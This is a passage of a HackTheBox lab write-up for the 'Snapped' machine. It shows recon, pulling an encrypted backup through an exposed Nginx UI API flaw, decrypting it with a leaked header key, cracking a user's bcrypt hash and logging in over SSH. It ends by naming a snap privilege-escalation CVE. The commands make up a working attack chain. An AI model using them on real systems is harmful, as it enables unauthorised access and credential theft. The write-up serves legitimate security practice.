#hard #in-progress #htb
# Enumeration

## Nmap

```bash
[hvidal@fedora] ~/d/h/h/m/s/scan
❯ nmap -p 22,80 -sCV -oN portscan.txt 10.129.21.165
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Snapped \xE2\x80\x94 Infrastructure. Orchestration. Control.
|_http-server-header: nginx/1.24.0 (Ubuntu)
```

## Subdomains

```bash
[hvidal@fedora] ~/d/h/h/m/s/scan
❯ ffuf -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -H "Host: FUZZ.snapped.htb" -fw 4 -u http://snapped.htb

admin.snapped.htb            [Status: 200, Size: 950]
```

Add the `admin.snapped.htb` subdomain to `/etc/hosts`
```bash
echo "10.129.21.165 snapped.htb admin.snapped.htb" | sudo tee -a /etc/hosts
```

# Exploitation

## Backup download

`admin.snapped.htb` runs **Nigx Ui**, which is vulnerable to backup download ([CVE-2026-27944](https://github.com/advisories/GHSA-g9w5-qffc-6762)):

Download `backup.zip` from `admin.snapped.htb/api/backup`

Backup.zip is encrypted, but the API sends the **AES-256** key via the `X-Backup-Security` header, **base64**-encoded and formatted as `key:iv` .

```bash
[hvidal@fedora] ~/d/h/h/m/s/content
❯ curl -i -D headers.txt -o backup.zip 'http://admin.snapped.htb/api/backup'
```

>[!Note]
>With this command headers are stored in `headers.txt` and the backup is downloaded as `backup.zip`

## Backup decryption

Unzip the backup:
```bash
[hvidal@fedora] ~/d/h/h/m/s/content
❯ unzip backup.zip
```

Export the decoded `key` and `iv` as environment variables:

```bash
[hvidal@fedora] ~/d/h/h/m/s/content
❯ export key=$(echo base64-ecoded_key | base64 -d | xxd -p -c 256)

[hvidal@fedora] ~/d/h/h/m/s/content
❯ export iv=$(echo base64-ecoded_iv | base64 -d | xxd -p -c 256)
```

>[!note]
>Key and iv are found in `headers.txt`:
>`X-Backup-Security: <base64-encoded_key>:<base64-encoded_iv>`

Decrypt the files in `backup.zip`:
```bash
[hvidal@fedora] ~/d/h/h/m/s/content
❯ openssl enc -d -aes-256-cbc -in ngix-ui.zip -out ngix-ui_dec.zip -K "$key" -iv "$iv"
```

## Database enumeration

`ngix-ui.zip` contains `database.db` which is a **sqlite** database.

```bash
[hvidal@fedora] ~/d/h/h/m/s/c/ngix-ui
❯ sqlite3 database.db
sqlite> .tables
acme_users         configs            namespaces         sites            
auth_tokens        dns_credentials    nginx_log_indices  streams          
auto_backups       dns_domains        nodes              upstream_configs 
ban_ips            external_notifies  notifications      users            
certs              llm_sessions       passkeys         
config_backups     migrations         site_configs     
sqlite> select id,name,password from users;
1|admin|$2a$10$8YdBq4e.WeQn8gv9E0ehh.quy8D/4mXHHY4ALLMAzgFPTrIVltEvm
2|jonathan|$2a$10$8M7JZSRLKdtJpx9YRUNTmODN.pKoBsoGCBi5Z8/WVGO2od9oCSyWq
```

It contains usernames and their hashes in **bcrypt**. We can put it into a file to crack it with `hashcat`:

```bash
[hvidal@fedora] ~/d/h/h/m/s/content
❯ hashcat -m 3200 hash /usr/share/wordlists/rockyou.txt
$2a$10$8M7JZSRLKdtJpx9YRUNTmODN.pKoBsoGCBi5Z8/WVGO2od9oCSyWq:linkinpark
```

Connect to the user `jonathan` via ssh.
```bash
[hvidal@fedora] ~/d/h/h/m/s/content
❯ ssh jonathan@snapped.htb
jonathan@snapped:~$ cat user.txt 
```

# Privilege escalation

## Enumeration

 The snap version is vulnerable to a TOCTOU race condition between `snap-confine` and `systemd-tmpfiles`. ([CVE-2026-3888](https://github.com/TheCyberGeek/CVE-2026-3888-snap-confine-systemd-tmpfiles-LPE))

```bash
jonathan@snapped:/$ snap --version
snap    2.63.1+24.04
snapd   2.63.1+24.04
```

>[!Note] TOCTOU race condition
>"Time Of Check to Time Of Use." It is a concurrency bug that happens when a program checks a condition about a resource and the program uses it after a short delay assuming nothing changed.

